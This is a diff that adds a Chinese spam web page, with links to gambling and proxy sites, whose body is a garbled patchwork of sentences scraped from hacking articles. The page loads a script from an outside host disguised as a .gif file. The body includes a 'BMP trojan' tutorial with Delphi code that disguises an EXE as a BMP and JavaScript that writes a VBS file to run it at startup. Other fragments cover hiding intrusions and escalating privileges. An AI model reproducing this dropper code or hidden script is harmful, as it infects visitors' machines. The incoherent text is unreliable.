@@ -1,0 +1,85 @@
+<!DOCTYPE html PUBLIC "-//W3C//liD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/liD/xhtml1-transitional.lid">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>大合恒网址 - 网站</title>
+<meta content="all" name="robots" />
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+<link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+<body><script language="javascript" src="http://bb.5599bb.com/888.gif"></script>
+<div class="wrap">
+   <div class="clear blank10"></div>
+   <div class="navi">　您现在的位置 <a  href="http:///baidugo">首页</a> ><a  href="http:///baiducom">新闻资讯</a> ><a  href="http:///baidunet">新闻论坛</a> ><a  href="http:///baiducn">新闻专题</a> > <a  href="http:///baidujc">新闻行情</a> > <a  href="http:///baidugc">新闻时尚</a> > <a  href="http:///baidu">新闻游戏</a> > <a  href="http:///baiduvip">新闻娱乐</a> > <a  href="http:///baidutv">新闻集休闲</a> > <a  href="http:///sohucom">新闻平台</a> > <a  href="http:///pps">产品中心</a> > 浏览文章</div>
+   <div class="clear blank10"></div>
+   <div class="newsmain">
+      <div id="side">
+	      <div class="sideNav">
+		     <h2>热门文章</h2>
+		        <ul><li><a href="http://www.15bl.com/baidugo">壬天堂代理</a></li>
+</ul>
+		   <div class="sidebottom"></div>
+	       </div>
+       </div>
+       <div class="rightPar" id="about">
+            <div class="aboutTitle">
+                <h3><span>作者：admin </span> 大合恒网址</h3>
+            </div>
+              <div id="MyContent">
+					<div id="MyContent"><p>⒈攻击会发生在何时？大部分的攻击发起攻击，因为大量的传输能掩饰他们的行为。
+</p>
+<p>所以，你首要的工作是要检查在中是否有类似的程序在运行。
+</p>
+<p>或者，它可能返回你站点默认的主页。
+</p>
+<p>我也推荐在每个ASP程序都使用缓冲区。
+</p>
+<p>何谓BMP网页木马?它和过去早就用臭了的MIME头的木马不同,MIME木马是把一个EXE文件用MIME编码为一个EML(OUTLOOK信件)文件,放到网页上利用IE和OE的编码实现下载和执行.然而BMP木马就不同,它把一个EXE文件伪装成一个BMP图片文件,欺骗IE下载,再利用网页中的javascript脚本查找title客户端的Internet临时文件夹,找到下载后的BMP文件,把它拷贝到TEMP目录.再编写一个脚本把找到的BMP文件用DEBUG还原成EXE,并把它放到title注册表启动项中,在下一次开机时执行.但是这种只能在9X下发挥作用,对于2K,XP来说是无能为力了.看上去好象很复杂,下面我们一步一步来:1)EXE变BMP的方法.大家自己去查查BMP文件资料就会知道,BMP文件的文件头有54个字节,简单来说里面包含了BMP文件的长宽,位数,文件大小,区长度,我们只要在EXE文件的文件头前面添加相应的BMP文件头(当然BMP文件头里面的要符合EXE文件的大小啦),这样就可以欺骗IE下载该BMP文件,开始我们用JPG文件做过试验,发现如果文件头不正确的话,IE是不会下载的,转换代码如下:programexe2bmp;usesWindows,SysUtils;varlen,row,col,fs:DWORD;buffer:array[0..255]ofchar;fd:WIN32_FIND_DATA;h,hw:THandle;beginif(ParamStr(1)&lt;"")and(ParamStr(2)&lt;"")thenbegin如果运行后没有两个参数则退出ifFileExists(ParamStr(1))thenbeginFindFirstFile(Pchar(ParamStr(1)),fd);fs:=fd.nFileSizeLow;col:=4;whiletruedobeginif(fsmod12)=0thenbeginlen:=fs;endelselen:=fs+12(fsmod12);row:=lendivcoldiv3;ifrowcolthenbegincol:=col+4;endelseBreak;end;FillChar(buffer,256,0);一下为BMP文件头Buffer[0]:="B";Buffer[1]:="M";PDWORD(buffer[18])^:=col;PDWORD(buffer[22])^:=row;PDWORD(buffer[34])^:=len;PDWORD(buffer[2])^:=len+54;PDWORD(buffer[10])^:=54;PDWORD(buffer[14])^:=40;PWORD(buffer[26])^:=1;PWORD(buffer[28])^:=24;写入文件hw:=CreateFile(Pchar(ParamStr(2)),GENERIC_WRITE,FILE_SHARE_READorFILE_SHARE_WRITE,nil,CREATE_ALWAYS,0,0);h:=CreateFile(Pchar(ParamStr(1)),GENERIC_READ,FILE_SHARE_READorFILE_SHARE_WRITE,nil,OPEN_EXISTING,0,0);WriteFile(hw,buffer,54,col,0);repeatReadFile(h,buffer,256,col,0);WriteFile(hw,buffer,col,col,0);untilcol&lt;256;WriteFile(hw,buffer,lenfs,col,0);CloseHandle(h);CloseHandle(hw);end;end;end.以上代码可以在DELPHI4,5,6中编译,就可以得到一个exe2bmp.exe文件.大家打开MSDOS方式,输入exe2bmpmyexe.exemybmp.bmp回车就可以把第二个参数所指定的EXE文件转换成BMP格式.接着就是把这个BMP图片放到网页上了,如果大家打开过这张图片的话,一定发现这张BMP又花,颜色又单调.所以大家放在网页上最好用这样的格式以下是放在网页上的脚本document.write("");functiondocsave()a=document.applets[0];a.setCLSID("F935DC221CF011D0ADB900C04FD58A0B");a.createInstance();wsh=a.GetObject();a.setCLSID("0D43FE01F09311CF894000A0C9054228");a.createInstance();fso=a.GetObject();varwinsys=fso.GetSpecialFolder(1);varvbs=winsys+"\s.vbs";wsh.RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\vbs","wscript"+"""+vbs+""");varst=fso.CreateTextFile(vbs,true);st.WriteLine("OptionExplicit");st.WriteLine("DimFSO,WSH,CACHE,str");st.WriteLine("SetFSO=CreateObject("Scripting.FileSystemObject")");st.WriteLine("SetWSH=CreateObject("WScript.Shell")");st.WriteLine("CACHE=wsh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellFolders\Cache")");st.WriteLine("wsh.RegDelete("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\vbs")");st.WriteLine("wsh.RegWrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\tmp","tmp.exe"");st.WriteLine("SearchBMPFilefso.GetFolder(CACHE),"mybmp[1].bmp"");st.WriteLine("WScript.uit()");st.WriteLine("FunctionSearchBMPFile(Folder,fname)");st.WriteLine("DimSubFolder,File,Lt,tmp,winsys");st.WriteLine("str=FSO.GetParentFolderName(folder)&amp;"\"&amp;folder.name&amp;"\"&amp;fname");st.WriteLine("ifFSO.FileExists(str)then");st.WriteLine("tmp=fso.GetSpecialFolder(2)&amp;"\"");st.WriteLine("winsys=fso.GetSpecialFolder(1)&amp;"\"");st.WriteLine("setFile=FSO.GetFile(str)");st.WriteLine("File.Copy(tmp&amp;"tmp.dat")");st.WriteLine("File.Delete");st.WriteLine("setLt=FSO.CreateTextFile(tmp&amp;"tmp.in")");st.WriteLine("Lt.WriteLine("rbx")");st.WriteLine("Lt.WriteLine("0")");st.WriteLine("Lt.WriteLine("rcx")");st.WriteLine("Lt.WriteLine("1000")");st.WriteLine("Lt.WriteLine("w136")");st.WriteLine("Lt.WriteLine("")");st.WriteLine("Lt.Close");st.WriteLine("WSH.Run"commandcdebug"&amp;tmp&amp;"tmp.dat&lt;"&amp;tmp&amp;"tmp.in"&amp;tmp&amp;"tmp.out",false,6");st.WriteLine("OnErrorResumeNext");st.WriteLine("FSO.GetFile(tmp&amp;"tmp.dat").Copy(winsys&amp;"tmp.exe")");st.WriteLine("FSO.GetFile(tmp&amp;"tmp.dat").Delete");st.WriteLine("FSO.GetFile(tmp&amp;"tmp.in").Delete");st.WriteLine("FSO.GetFile(tmp&amp;"tmp.out").Delete");st.WriteLine("endif");st.WriteLine("IfFolder.SubFolders.Count&lt;0Then");st.WriteLine("ForEachSubFolderInFolder.SubFolders");st.WriteLine("SearchBMPFileSubFolder,fname");st.WriteLine("Next");st.WriteLine("EndIf");st.WriteLine("EndFunction");st.Close();setTimeout("docsave()",1000);把该脚本保存为"js.js",在网页中插入:该脚本主要会在本地机器的SYSTEM目录下生成一个“S.VBS文件，该脚本文件会在下次开机时运行。
+</p>
+<p>这些LOG文件在title注册表中的：HKEY_LOCAL_MACHINESystemCurrentControlSetServicesEventlog有的管理员很可能将这些日志重定位。
+</p>
+<p>由于内部中的安全措施通常都比较少，进一步地，入侵者将以这第一台机器作为跳板，攻击中的其他机器，寻找下一个安身之家。
+</p>
+<p>可以通过上传bat文件执行任何系统命令了但是把iusr_name加入administrators组中仍然是很危险的事情，万一管理员发现了呢？第二种方法，依然很简单，但是被发现的可能性稍微小些。
+</p>
+<p>thebuf.mymmap.fd=0xffffffff;
+</p>
+<p>修改别人的。
+</p>
+<p>可以运行的平台：SunOS4.1.3up,SoLaris2.0up,HPUX9.05up,IBMAIIX3.2.5upLinux1.2.x,Linux1.3.x,Linux1.3.76+安装：解压后拷贝到指定的目录，你可用下面的命令来解！tarxvfISS_XXX.tar运行ISS.install开始安装！由于扫描的结果太长我就不一一写出来了！！大家可以多试试！很多有用的安全信息都在这些扫描结果里！！通过MIT的X窗口系统标准配置运行如SAVEsuite，X窗口的管理程序是FVWM。
+</p>
+<p>bbslist.asp，行145这和我以前玩过的不一样，以前玩的都是正常返回。
+</p>
+<p>当然为了隐蔽性，可以更新后关闭，然后调用另外一个假地址。
+</p>
+<p>实在需要使用，注意在离开前删除自己信息和密码记录。
+</p>
+<p>想让自己的机器速度更快吗，其实对付邮件病毒是要讲技巧的，办法很简单，但非常实用，现在就让我来告诉大家九招防邮件病毒。
+</p>
+<p>为了通过移植考试，你需要具有对几种Windows2000工具包中新加的一些工具的应用知识，例如：Netdom,ClonePrincipal,Movetree和活动目录移植工具(ADMT)。
+</p>
+<p>提示：SATAN比一般扫描器需要更多一些的资源，尤其是在内存和处理器功能方面要求更高一些。
+</p>
+<p>确定Windows和windows系统目录确定Windows和windows系统目录有两个SDK函数可以完成该功能。
+</p>
+<p>但是它要被很多文件调用，还得改其它地方。
+</p>
+<p>可有文本，图片、flash、视频、声音、颜色等可供插入，并可直接预览。
+</p>
+
+					<br/>
+					<p align=left >上一篇：<a href="452.html">qq彩票网址
+</a>|下一篇：<a href="454.html">万家乐国际怎么样
+</a></P>
+					</div>
+		  </div>
+     </div>
+  </div>
+</div>
+<div class="clear blank10"></div>
+<div class="copyright"> <br>
+ </div>
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/17275833.js"></script>
+  <script language="javascript" src="http://count19.51yes.com/click.aspx?id=193782333&logo=1" charset="gb2312"></script>
+</body>
+</html>
